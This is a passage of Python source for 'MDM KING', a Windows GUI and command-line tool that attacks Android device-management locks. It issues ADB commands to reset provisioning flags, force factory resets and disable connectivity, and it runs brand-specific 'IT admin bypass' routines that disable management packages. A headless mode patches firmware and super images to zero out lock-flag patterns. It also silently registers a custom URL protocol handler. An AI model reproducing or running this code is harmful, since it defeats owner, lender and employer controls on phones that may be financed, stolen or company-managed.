        subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a android.intent.action.FACTORY_RESET 2>/dev/null'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put global device_provisioned 0 2>/dev/null'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put secure user_setup_complete 0 2>/dev/null'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'svc wifi disable && svc data disable'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'reboot recovery'], timeout=30, creationflags=flags)
        self.log('Factory reset sent — device rebooting to recovery', 's')

    def _adb_read_info(self):
        adb = os.path.join(self._tools_dir(), 'adb.exe')
        for p in [adb, r'C:\Program Files\platform-tools\adb.exe']:
            if os.path.isfile(p): adb = p; break
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=5)
        serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
        if not serials:
            self.root.after(0, lambda: self.log('No device', 'e'))
            return
        s = serials[0]
        raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=10).stdout
        p = {}
        for line in raw.split('\n'):
            if ']: [' in line:
                k, v = line.strip()[1:].split(']: [', 1)
                p[k] = v.rstrip(']')
        def g(*keys):
            for k in keys:
                v = p.get(k, '')
                if v: return v
                try: v = subprocess.run([adb, '-s', s, 'shell', f'getprop {k}'], capture_output=True, text=True, timeout=3).stdout.strip()
                except Exception: pass
                if v: p[k] = v; return v
            return ''
        fields = [
            ('📱', 'Model', g('ro.product.model')),
            ('🏭', 'Brand', g('ro.product.brand')),
            ('🤖', 'Android', g('ro.build.version.release')),
            ('📦', 'SDK', g('ro.build.version.sdk')),
            ('⚙️', 'CPU', g('ro.product.board', 'ro.board.platform')),
            ('💻', 'Arch', g('ro.product.cpu.abi')),
        ]
        self._last_device_props = {name: val for _, name, val in fields if val}
        self._build_device_info_card(fields)
        self._add_device_export_buttons()
        self.log('Device info read', 's')

    def _add_device_export_buttons(self):
        export_frame = tk.Frame(self.content, bg=self.c['card'], bd=0,
            highlightthickness=1, highlightcolor=self.c['border'], highlightbackground=self.c['border'])
        btn_row = tk.Frame(export_frame, bg=self.c['card'])
        btn_row.pack(pady=6)
        tk.Button(btn_row, text='Export JSON', font=('Segoe UI', 8),
            bg=self.c['accent'], fg='#fff', relief=tk.FLAT, padx=12, pady=2,
            command=self._export_device_json).pack(side=tk.LEFT, padx=4)
        tk.Button(btn_row, text='Export CSV', font=('Segoe UI', 8),
            bg=self.c['accent'], fg='#fff', relief=tk.FLAT, padx=12, pady=2,
            command=self._export_device_csv).pack(side=tk.LEFT, padx=4)
        cw = getattr(self, '_device_info_card', None)
        if cw: export_frame.pack(fill=tk.X, before=cw, pady=(0, 6), ipady=4)
        self._device_export_frame = export_frame

    def _export_device_json(self):
        path = filedialog.asksaveasfilename(defaultextension='.json',
            filetypes=[('JSON', '*.json')], title='Export device info as JSON')
        if not path: return
        try:
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(getattr(self, '_last_device_props', {}), f, indent=2)
            self.log(f'Device info exported to {os.path.basename(path)}', 's')
        except Exception as e:
            self.log(f'Export failed: {e}', 'e')

    def _export_device_csv(self):
        path = filedialog.asksaveasfilename(defaultextension='.csv',
            filetypes=[('CSV', '*.csv')], title='Export device info as CSV')
        if not path: return
        try:
            props = getattr(self, '_last_device_props', {})
            with open(path, 'w', newline='', encoding='utf-8-sig') as f:
                f.write('Property,Value\r\n')
                for k, v in props.items():
                    f.write(f'{k},{v}\r\n')
            self.log(f'Device info exported to {os.path.basename(path)}', 's')
        except Exception as e:
            self.log(f'Export failed: {e}', 'e')

    def _build_device_info_card(self, fields):
        cw = None
        for w in self.content.winfo_children():
            if isinstance(w, tk.Frame) and w.winfo_children():
                for ch in w.winfo_children():
                    if isinstance(ch, tk.Label) and 'Bypass Methods' in ch.cget('text'):
                        cw = w; break
                if cw: break
        if cw is None:
            for w in self.content.winfo_children():
                if isinstance(w, tk.Frame):
                    cw = w; break
        if cw is None: return
        old = getattr(self, '_device_info_card', None)
        if old:
            try: old.destroy()
            except Exception: pass
        card = self._show_device_card('Device Info', '📱', fields)
        card.pack(fill=tk.X, before=cw, pady=(0, 6), ipady=4)
        self._device_info_card = card

    def _open_pattern_editor(self):
        win = tk.Toplevel(self.root)
        win.title('Hex Pattern Editor')
        win.geometry('700x500')
        win.configure(bg=self.c['bg'])
        win.transient(self.root)
        win.grab_set()
        self._set_icon(win)

        top_frame = tk.Frame(win, bg=self.c['bg'])
        top_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        cols = ('name', 'chipset', 'hex', 'desc')
        tree = ttk.Treeview(top_frame, columns=cols, show='headings', height=12)
        tree.heading('name', text='Name')
        tree.heading('chipset', text='Chipset')
        tree.heading('hex', text='Hex Bytes')
        tree.heading('desc', text='Description')
        tree.column('name', width=160)
        tree.column('chipset', width=70)
        tree.column('hex', width=180)
        tree.column('desc', width=200)

        vsb = ttk.Scrollbar(top_frame, orient=tk.VERTICAL, command=tree.yview)
        tree.configure(yscrollcommand=vsb.set)
        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        def _refresh_tree():
            tree.delete(*tree.get_children())
            for i, pat in enumerate(ALL_HEX_PATTERNS):
                tree.insert('', tk.END, iid=str(i),
                    values=(pat['name'], pat['chipset'], pat['bytes'].hex(), pat.get('desc', '')))

        _refresh_tree()

        edit_frame = tk.Frame(win, bg=self.c['bg'])
        edit_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        tk.Label(edit_frame, text='Name:', fg=self.c['fg'], bg=self.c['bg'],
            font=('Segoe UI', 8)).grid(row=0, column=0, sticky='w', padx=(0, 4))
        name_var = tk.StringVar()
        name_entry = tk.Entry(edit_frame, textvariable=name_var, bg=self.c['card'],
            fg=self.c['fg'], font=('Segoe UI', 8))
        name_entry.grid(row=0, column=1, sticky='ew', padx=(0, 10))

        tk.Label(edit_frame, text='Chipset:', fg=self.c['fg'], bg=self.c['bg'],
            font=('Segoe UI', 8)).grid(row=0, column=2, sticky='w', padx=(0, 4))
        chipset_var = tk.StringVar(value='all')
        chipset_combo = ttk.Combobox(edit_frame, textvariable=chipset_var,
            values=['all', 'mtk', 'spd'], state='readonly', width=8)
        chipset_combo.grid(row=0, column=3, sticky='w')

        tk.Label(edit_frame, text='Hex (hex string):', fg=self.c['fg'], bg=self.c['bg'],
            font=('Segoe UI', 8)).grid(row=1, column=0, sticky='w', padx=(0, 4), pady=(4, 0))
        hex_var = tk.StringVar()
        hex_entry = tk.Entry(edit_frame, textvariable=hex_var, bg=self.c['card'],
            fg=self.c['fg'], font=('Segoe UI', 8))
        hex_entry.grid(row=1, column=1, columnspan=3, sticky='ew', padx=(0, 10), pady=(4, 0))

        tk.Label(edit_frame, text='Description:', fg=self.c['fg'], bg=self.c['bg'],
            font=('Segoe UI', 8)).grid(row=2, column=0, sticky='w', padx=(0, 4), pady=(4, 0))
        desc_var = tk.StringVar()
        desc_entry = tk.Entry(edit_frame, textvariable=desc_var, bg=self.c['card'],
            fg=self.c['fg'], font=('Segoe UI', 8))
        desc_entry.grid(row=2, column=1, columnspan=3, sticky='ew', padx=(0, 10), pady=(4, 0))

        edit_frame.columnconfigure(1, weight=1)

        def _tree_select(event):
            sel = tree.selection()
            if not sel: return
            iid = int(sel[0])
            pat = ALL_HEX_PATTERNS[iid]
            name_var.set(pat['name'])
            chipset_var.set(pat['chipset'])
            hex_var.set(pat['bytes'].hex())
            desc_var.set(pat.get('desc', ''))

        tree.bind('<<TreeviewSelect>>', _tree_select)

        def _clear_form():
            name_var.set('')
            chipset_var.set('all')
            hex_var.set('')
            desc_var.set('')
            tree.selection_remove(*tree.selection())

        def _add_pattern():
            name = name_var.get().strip()
            hex_str = hex_var.get().strip().replace(' ', '')
            desc = desc_var.get().strip()
            chipset = chipset_var.get()
            if not name or not hex_str:
                messagebox.showwarning('Missing Fields', 'Name and Hex are required.', parent=win)
                return
            if not re.fullmatch(r'[0-9a-fA-F]+', hex_str):
                messagebox.showwarning('Invalid Hex', 'Hex must contain only hex characters (0-9, a-f).', parent=win)
                return
            if len(hex_str) % 2 != 0:
                messagebox.showwarning('Invalid Hex', 'Hex string length must be even.', parent=win)
                return
            ALL_HEX_PATTERNS.append({
                'name': name,
                'chipset': chipset,
                'bytes': bytes.fromhex(hex_str),
                'desc': desc or name,
            })
            _refresh_tree()
            _clear_form()

        def _delete_pattern():
            sel = tree.selection()
            if not sel: return
            iid = int(sel[0])
            if messagebox.askyesno('Delete',
                    f'Delete pattern "{ALL_HEX_PATTERNS[iid]["name"]}"?', parent=win):
                del ALL_HEX_PATTERNS[iid]
                _refresh_tree()
                _clear_form()

        def _update_pattern():
            sel = tree.selection()
            if not sel: return
            iid = int(sel[0])
            name = name_var.get().strip()
            hex_str = hex_var.get().strip().replace(' ', '')
            desc = desc_var.get().strip()
            chipset = chipset_var.get()
            if not name or not hex_str:
                messagebox.showwarning('Missing Fields', 'Name and Hex are required.', parent=win)
                return
            if not re.fullmatch(r'[0-9a-fA-F]+', hex_str):
                messagebox.showwarning('Invalid Hex', 'Hex must contain only hex characters (0-9, a-f).', parent=win)
                return
            if len(hex_str) % 2 != 0:
                messagebox.showwarning('Invalid Hex', 'Hex string length must be even.', parent=win)
                return
            ALL_HEX_PATTERNS[iid] = {
                'name': name,
                'chipset': chipset,
                'bytes': bytes.fromhex(hex_str),
                'desc': desc or name,
            }
            _refresh_tree()
            _clear_form()

        btn_frame = tk.Frame(win, bg=self.c['bg'])
        btn_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        tk.Button(btn_frame, text='Add', font=('Segoe UI', 8),
            bg=self.c['accent'], fg='#fff', relief=tk.FLAT, padx=14,
            command=_add_pattern).pack(side=tk.LEFT, padx=2)
        tk.Button(btn_frame, text='Update', font=('Segoe UI', 8),
            bg=self.c['orange'], fg=self.c['bg'], relief=tk.FLAT, padx=14,
            command=_update_pattern).pack(side=tk.LEFT, padx=2)
        tk.Button(btn_frame, text='Delete', font=('Segoe UI', 8),
            bg=self.c['red'], fg=self.c['white'], relief=tk.FLAT, padx=14,
            command=_delete_pattern).pack(side=tk.LEFT, padx=2)
        tk.Button(btn_frame, text='Clear', font=('Segoe UI', 8),
            bg=self.c['muted'], fg=self.c['white'], relief=tk.FLAT, padx=14,
            command=_clear_form).pack(side=tk.LEFT, padx=2)
        tk.Button(btn_frame, text='Close', font=('Segoe UI', 8),
            bg=self.c['surface2'], fg=self.c['white'], relief=tk.FLAT, padx=14,
            command=win.destroy).pack(side=tk.RIGHT, padx=2)

    def _run_universal_bypass(self):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            steps = ['Device Info', 'Install', 'Owner', 'Daemons', 'Purge', 'DNS', 'Lockdown', 'Reboot']
            self._build_progress_ui('UNIVERSAL BYPASS OLD', 8, steps)
            self.root.after(0, lambda: self._show_progress('UNIVERSAL BYPASS OLD'))
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
            self.log('BYPASSING', 'h')
            self._adb_bypass_core('UNIVERSAL', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'] + CHIPSET_PACKAGES['mtk'],
                disable_pkgs=True, quiet=False)
            self.root.after(0, lambda: self._finish_progress(True, 'UNIVERSAL BYPASS OLD COMPLETE'))
            self.root.after(0, lambda: self.status_var.set('Done — Universal Bypass Old complete'))
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
            self._open_package_freeze(adb, s)
        except Exception as _e:
            self.log(f'Universal bypass error: {_e}', 'e')
            import traceback as _tb
            for _l in _tb.format_exc().split('\n'):
                if _l.strip(): self.log(_l, 'e')


    def _run_it_admin_bypass(self, brand, packages):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            steps = ['Device Info', 'Install', 'Owner', 'Daemons', 'Purge', 'DNS', 'Lockdown', 'Reboot']
            self._build_progress_ui(f'{brand} IT ADMIN', 8, steps)
            self.root.after(0, lambda: self._show_progress(f'{brand} IT ADMIN'))
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
            self.log('BYPASSING', 'h')
            self._adb_bypass_core(brand, packages + ['com.android.vending'],
                disable_pkgs=True, quiet=False)
            self.root.after(0, lambda: self._finish_progress(True, f'{brand} IT ADMIN BYPASS COMPLETE'))
            self.root.after(0, lambda: self.status_var.set(f'Done — {brand} IT admin bypass complete'))
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
            self._open_package_freeze(adb, s)
        except Exception as _e:
            self.log(f'{brand} IT Admin error: {_e}', 'e')
            try: self.root.after(0, lambda: self._finish_progress(False, f'{brand} bypass failed'))
            except Exception: pass
            import traceback as _tb
            self.log(_tb.format_exc(), 'e')

    def _run_vivo_bypass(self):
        self._run_it_admin_bypass('VIVO', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['vivo'])

    def _run_xiaomi_bypass(self):
        self._run_it_admin_bypass('XIAOMI', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['xiaomi'])

    def _run_oppo_bypass(self):
        self._run_it_admin_bypass('OPPO', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['oppo'])

    def _run_realme_bypass(self):
        self._run_it_admin_bypass('REALME', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['realme'])

    def _run_tecno_bypass(self):
        self._run_it_admin_bypass('TECNO', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['tecno'])

    def _run_infinix_bypass(self):
        self._run_it_admin_bypass('INFINIX', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['infinix'])

def _require_internet():
    """Block startup if no internet — mandatory check."""
    for url in ['http://8.8.8.8', 'http://1.1.1.1', 'http://google.com']:
        try:
            urllib.request.urlopen(url, timeout=3)
            return True
        except Exception: continue
    return False

if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == '--patch-loop':
        _patch_loop_worker(sys.argv[2])
        sys.exit(0)
    if len(sys.argv) > 2 and sys.argv[1] == '--patch-worker':
        _sub_patch_worker(sys.argv[2])
        sys.exit(0)
    # ── Console/headless mode (Knox Wizard-style StartConsole) ──
    import argparse
    _parser = argparse.ArgumentParser(description='MDM KING — Firmware Security Tool')
    _parser.add_argument('--part-patch', metavar='DIR', help='Patch all partitions in DIR')
    _parser.add_argument('--super-patch', metavar='FILE', help='Patch a super image FILE')
    _parser.add_argument('--output', '-o', metavar='DIR', help='Output directory for patched files')
    _parser.add_argument('--chipset', choices=['mtk', 'spd', 'all'], default='all', help='Target chipset for hex patterns')
    _parser.add_argument('--verbose', '-v', action='store_true', help='Verbose console output')
    _args = _parser.parse_args()

    # Mandatory internet check (skip for --help)
    if not any(getattr(_args, a, None) for a in ['part_patch', 'super_patch']):
        if not _require_internet():
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, 'Internet connection required.\nPlease connect to the internet and restart MDM KING.', 'MDM KING — No Internet', 0x10)
            sys.exit(1)

    if _args.part_patch or _args.super_patch:
        # ── Headless mode ──
        def _console_log(msg, level='i'):
            tag = {'i': '[*]', 's': '[+]', 'w': '[!]', 'e': '[-]', 'c': '[#]'}.get(level, '[?]')
            print(f'{tag} {msg}')
        if _args.chipset == 'mtk':
            _active_patterns = [p for p in ALL_HEX_PATTERNS if p['chipset'] in ('mtk', 'all')]
        elif _args.chipset == 'spd':
            _active_patterns = [p for p in ALL_HEX_PATTERNS if p['chipset'] in ('spd', 'all')]
        else:
            _active_patterns = ALL_HEX_PATTERNS
        _console_log(f'Loaded {len(_active_patterns)} hex patterns for chipset {_args.chipset}', 's')
        if _args.super_patch:
            _path = _args.super_patch
            if not os.path.isfile(_path):
                _console_log(f'Super image not found: {_path}', 'e'); sys.exit(1)
            _out = _args.output or os.path.splitext(_path)[0] + '_patched.img'
            _fsize = os.path.getsize(_path)
            _console_log(f'Patching super image: {_path} ({_fsize // (1024*1024)} MB)', 'i')
            _finder = FastPatternFinder(_active_patterns)
            _hit_ranges = []
            _chunk = 64 * 1024 * 1024
            try:
                with open(_path, 'rb') as f:
                    off = 0
                    while off < _fsize:
                        f.seek(off)
                        d = f.read(_chunk)
                        if not d: break
                        for pos, pat in _finder.find_multi(d):
                            pb = pat['bytes']
                            _hit_ranges.append((off + pos, off + pos + len(pb)))
                        off += _chunk
                if _hit_ranges:
                    _hit_ranges.sort()
                    _merged = [_hit_ranges[0]]
                    for r in _hit_ranges[1:]:
                        if r[0] <= _merged[-1][1]:
                            _merged[-1] = (_merged[-1][0], max(_merged[-1][1], r[1]))
                        else: _merged.append(r)
                    _hit_ranges = _merged
                _console_log(f'Found {len(_hit_ranges)} hex pattern ranges', 's')
            except Exception as e:
                _console_log(f'Hex scan failed: {e}', 'e'); sys.exit(1)
            _HEADER_SKIP = 256 * 1024; _FOOTER_SKIP = 1024 * 1024
            _CHUNK = 64 * 1024 * 1024; _OVERLAP = 65536
            _ZERO_PAGE = b'\x00' * (1024 * 1024)
            _total = 0
            _super_bak = _safe_backup(_path)
            if _super_bak: _console_log(f'Backup: {os.path.basename(_super_bak)}', 's')
            try:
                with open(_path, 'rb') as fin, open(_out, 'wb') as fout:
                    _cn = 0; _tc = max(1, (_fsize + _CHUNK - 1) // _CHUNK)
                    while True:
                        _start = _cn * _CHUNK; _ob = min(_OVERLAP, _start)
                        fin.seek(_start - _ob); _raw = fin.read(_CHUNK + _ob)
                        if not _raw: break
                        _parts = []
                        _prev = 0
                        for _zs, _ze in _hit_ranges:
                            _cs = _start - _ob
                            _zz = max(_zs, _cs); _ze2 = min(_ze, _cs + len(_raw))
                            if _zz < _ze2:
                                if _zz > _cs + _prev:
                                    _parts.append(_raw[_prev:_zz - _cs])
                                _fill = min(_ze2 - _zz, 1024 * 1024)
                                _parts.append(_ZERO_PAGE[:_fill])
                                _prev = _zz - _cs + _fill
                        if _prev < len(_raw):
                            _parts.append(_raw[_prev:])
                        _data = b''.join(_parts) if _parts else _raw
                        # MDM pattern replacement (same as subprocess worker)
                        _abs_start = _start - _ob
                        _lo = max(_HEADER_SKIP - _abs_start, 0) if _abs_start < _HEADER_SKIP else 0
                        _hi = len(_data) - max(0, (_abs_start + len(_data)) - (_fsize - _FOOTER_SKIP)) if (_abs_start + len(_data)) > (_fsize - _FOOTER_SKIP) else len(_data)
                        if _lo < _hi and _data:
                            for _pat, _rep in zip(MDM_PATTERNS, MDM_REPLACEMENTS):
                                _pieces = []; _pos = 0
                                while _pos < len(_data):
                                    _idx = _data.find(_pat, max(_pos, _lo), _hi)
                                    if _idx < 0: _pieces.append(_data[_pos:]); break
                                    if _idx > _pos: _pieces.append(_data[_pos:_idx])
                                    _pieces.append(_rep); _pos = _idx + len(_pat)
                                if len(_pieces) > 1: _data = b''.join(_pieces)
                        fout.write(_data[_ob:_ob + _CHUNK])
                        _cn += 1
                _console_log(f'Wrote patched image: {_out}', 's')
                # Verify
                try:
                    with open(_out, 'rb') as f: _vd = f.read(min(_fsize, 128*1024*1024))
                    _vok, _vmsg = VerifyData(bytes(len(_vd)), _vd, _hit_ranges)
                    _console_log(f'VerifyData: {_vmsg}', 's' if _vok else 'w')
                    if not _vok:
                        _console_log('Verify failed - output may be corrupt', 'e')
                        try: os.remove(_out)
                        except Exception: pass
                except Exception as ve: _console_log(f'Verify error: {ve}', 'w')
            except Exception as e:
                _console_log(f'Patch failed: {e}', 'e')
                try: os.remove(_out)
                except Exception: pass
                sys.exit(1)
        if _args.part_patch:
            _indir = _args.part_patch
            _outdir = _args.output or os.path.join(_indir, 'patched')
            if not os.path.isdir(_indir):
                _console_log(f'Partition directory not found: {_indir}', 'e'); sys.exit(1)
            os.makedirs(_outdir, exist_ok=True)
            _console_log(f'Patching partitions in: {_indir}', 'i')
            _finder = FastPatternFinder(_active_patterns)
            for _f in sorted(os.listdir(_indir)):
                _fp = os.path.join(_indir, _f)
                if not os.path.isfile(_fp): continue
                _console_log(f'  Scanning: {_f}', 'i')
                try:
                    with open(_fp, 'rb') as f: _data = bytearray(f.read())
                    _hits = _finder.find_multi(_data)
                    _wr = WipeRange(_data)
                    _wr.add_from_hits(_hits)
                    _cnt = _wr.commit()
                    if _hits:
                        _outp = os.path.join(_outdir, _f.replace('.bin', '_patched.bin').replace('.img', '_patched.img'))
                        with open(_outp, 'wb') as f: f.write(bytes(_data))
                        _console_log(f'    {len(_hits)} patches -> {os.path.basename(_outp)}', 's')
                    else:
                        _console_log(f'    No lock flags found', 'i')
                except Exception as e:
                    _console_log(f'    Error: {e}', 'e')
        _console_log('Done', 's')
        sys.exit(0)

    # ── Single-instance check ──
    _second_instance = False
    try:
        import ctypes
        _k32 = ctypes.WinDLL('kernel32', use_last_error=True)
        _m = _k32.CreateMutexW(None, False, 'MDM_KING_PASSWORD_RESET')
        if _k32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            _second_instance = True
    except: pass

    # ── Register mdmking:// protocol handler ──
    try:
        import winreg
        _script = os.path.abspath(sys.argv[0])
        _exe = sys.executable
        _cmd = f'"{_exe}" "{_script}"' if not getattr(sys, 'frozen', False) else f'"{_script}"'
        _key = r'SOFTWARE\Classes\mdmking'
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _key) as k:
            winreg.SetValue(k, '', winreg.REG_SZ, 'URL:MDM KING Reset')
            winreg.SetValueEx(k, 'URL Protocol', 0, winreg.REG_SZ, '')
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _key + r'\shell\open\command') as k:
            winreg.SetValue(k, '', winreg.REG_SZ, f'{_cmd} --reset "%1"')
    except: pass

    # ── Parse --reset URL from command line ──
    _reset_token = ''
    _reset_email = ''
    for _arg in sys.argv[1:]:
        if _arg.startswith('--reset='):
            _url = _arg.split('=', 1)[1]
        elif _arg == '--reset' and len(sys.argv) > sys.argv.index(_arg) + 1:
            _url = sys.argv[sys.argv.index(_arg) + 1]
        else:
            continue
        try:
            from urllib.parse import urlparse, parse_qs
            _parsed = urlparse(_url)
            _params = parse_qs(_parsed.query)
            _reset_token = _params.get('token', [''])[0]
            _reset_email = _params.get('email', [''])[0]
        except: pass
        break

    login_win = tk.Tk()
    login_win.geometry('+9999+9999')
    login_win.title('MDM KING  LOGIN')
    login_win.configure(bg='#0d001a')
    login_win.resizable(False, False)

    # Set icon early — before any update
    _icon_set = False
    for _src in ['tools/mdm_king_logo_circular.ico']:
        _p = _asset(_src)
        if os.path.isfile(_p):
            try:
                login_win.iconbitmap(_p)
                _icon_set = True; break
            except: pass
    try:
        from PIL import Image, ImageTk
        for _src in ['tools/mdm_king_logo_circular_32.png', 'tools/mdm_king_logo_circular.png']:
            _p = _asset(_src)
            if os.path.isfile(_p):
                login_win._app_icon = ImageTk.PhotoImage(file=_p)
                login_win.iconphoto(True, login_win._app_icon)
                _icon_set = True; break
    except Exception:
        for _src in ['tools/mdm_king_logo_circular.png', 'tools/mdm_king_logo_circular_32.png']:
            _p = _asset(_src)
            if os.path.isfile(_p):
                try:
                    login_win._app_icon = tk.PhotoImage(file=_p)
                    login_win.iconphoto(True, login_win._app_icon)
                    _icon_set = True; break
                except: pass

    login_win.update()

    # Splash with 3D circular logo from hi-res source
    splash = tk.Toplevel(login_win)
    splash.overrideredirect(True)
    splash.configure(bg='#0d001a')
    ssw = splash.winfo_screenwidth()
    ssh = splash.winfo_screenheight()
    ssize = 320
    splash.geometry(f'{ssize}x{ssize}+{(ssw-ssize)//2}+{(ssh-ssize)//2}')
    splash.lift()
    splash.attributes('-topmost', True)
    splash_img = None
    try:
        from PIL import Image, ImageTk, ImageDraw, ImageFilter, ImageEnhance
        src_path = _asset('MDM King logo design with crown.png')
        if not os.path.isfile(src_path):
            src_path = _asset('tools/mdm_king_logo_circular.png')
        if os.path.isfile(src_path):
            img = Image.open(src_path).convert('RGBA')
            # Resize to 240×240 from hi-res (crisp)
            logo_size = 220
            img = img.resize((logo_size, logo_size), Image.LANCZOS)
            # Circular mask
            mask = Image.new('L', (logo_size, logo_size), 0)
            draw = ImageDraw.Draw(mask)
            draw.ellipse((2, 2, logo_size-2, logo_size-2), fill=255)
            # Add 3D bevel/inner shadow effect
            canvas_size = logo_size + 40
            final = Image.new('RGBA', (canvas_size, canvas_size), (0, 0, 0, 0))
            # Drop shadow layer
            shadow = Image.new('RGBA', (logo_size, logo_size), (0, 0, 0, 0))
            shadow_draw = ImageDraw.Draw(shadow)
            shadow_draw.ellipse((0, 0, logo_size, logo_size), fill=(0, 0, 0, 80))
            shadow = shadow.filter(ImageFilter.GaussianBlur(radius=8))
            shadow_offset = (canvas_size - logo_size) // 2 + 4
            final.paste(shadow, (shadow_offset, shadow_offset + 4), shadow)
            # Apply circular mask to logo
            logo_circle = Image.new('RGBA', (logo_size, logo_size), (0, 0, 0, 0))
            logo_circle.paste(img, (0, 0), mask)
            # 3D inner glow — light from top-left
            glow = Image.new('RGBA', (logo_size, logo_size), (0, 0, 0, 0))
            gdraw = ImageDraw.Draw(glow)
            for i in range(12, 0, -1):
                alpha = int(25 * (1 - i / 12))
                gdraw.ellipse((i, i, logo_size-i, logo_size-i), outline=(255, 255, 255, alpha))
            logo_circle = Image.alpha_composite(logo_circle, glow)
            # Paste logo centered
            offset = (canvas_size - logo_size) // 2
            final.paste(logo_circle, (offset, offset), logo_circle)
            splash_img = ImageTk.PhotoImage(final)
            lbl = tk.Label(splash, image=splash_img, bg='#0d001a')
            lbl.image = splash_img
            lbl.pack(expand=True)
    except Exception:
        pass
    splash.update()
    splash.after(2000, splash.destroy)

    sw = login_win.winfo_screenwidth()
    sh = login_win.winfo_screenheight()
    login_win.geometry(f'400x620+{(sw-400)//2}+{(sh-620)//2}')
    login_win.lift()

    # Subtle background particles (static dots, behind everything)
    _particles = tk.Canvas(login_win, bg=COLORS['bg'], bd=0, highlightthickness=0)
    _particles.place(x=0, y=0, relwidth=1, relheight=1)
    for _ in range(25):
        x = __import__('random').randint(0, 400)
        y = __import__('random').randint(0, 620)
        _particles.create_oval(x, y, x+2, y+2, fill=COLORS['accent'], outline='')


    # Top glow bar — gradient-like multi-layer
    glow_frame = tk.Frame(login_win, bg=COLORS['bg'], height=5)
    glow_frame.pack(fill=tk.X)
    tk.Frame(glow_frame, bg=COLORS['accent'], height=2).pack(fill=tk.X)
    tk.Frame(glow_frame, bg=COLORS['accent2'], height=1).pack(fill=tk.X)
    tk.Frame(glow_frame, bg=COLORS['accent'], height=1).pack(fill=tk.X, pady=(0, 1))

    # Logo area with glow
    try:
        from PIL import Image, ImageTk, ImageDraw
        logo_path = _asset('tools/mdm_king_logo.png')
        if os.path.isfile(logo_path):
            img = Image.open(logo_path).resize((90, 90), Image.LANCZOS)
            mask = Image.new('L', (90, 90), 0)
            ImageDraw.Draw(mask).ellipse((2, 2, 88, 88), fill=255)
            img.putalpha(mask)
            logo_tk = ImageTk.PhotoImage(img)
            logo_frame = tk.Frame(login_win, bg=COLORS['bg'], highlightthickness=2,
                highlightcolor=COLORS['accent'], highlightbackground=COLORS['accent'])
            logo_frame.pack(pady=(28, 0))
            tk.Label(logo_frame, image=logo_tk, bg=COLORS['bg']).pack(padx=4, pady=4)
            login_win._logo_lbl = logo_tk
    except Exception:
        logo_path = _asset('tools/mdm_king_logo.png')
        if os.path.isfile(logo_path):
            try:
                login_win._logo_lbl = tk.PhotoImage(file=logo_path)
                logo_frame = tk.Frame(login_win, bg=COLORS['bg'], highlightthickness=2,
                    highlightcolor=COLORS['accent'], highlightbackground=COLORS['accent'])
                logo_frame.pack(pady=(28, 0))
                tk.Label(logo_frame, image=login_win._logo_lbl, bg=COLORS['bg']).pack(padx=4, pady=4)
            except Exception:
                tk.Label(login_win, text='⚙', font=('Segoe UI', 48),
                         fg=COLORS['accent2'], bg=COLORS['bg']).pack(pady=(32, 0))
        else:
            tk.Label(login_win, text='⚙', font=('Segoe UI', 48),
                     fg=COLORS['accent2'], bg=COLORS['bg']).pack(pady=(32, 0))

    # Title
    tk.Label(login_win, text='MDM KING', font=('Segoe UI', 24, 'bold'),
             fg=COLORS['accent2'], bg=COLORS['bg']).pack(pady=(10, 0))
    tk.Label(login_win, text='Sign in to your account', font=('Segoe UI', 9),
             fg=COLORS['muted'], bg=COLORS['bg']).pack(pady=(2, 14))

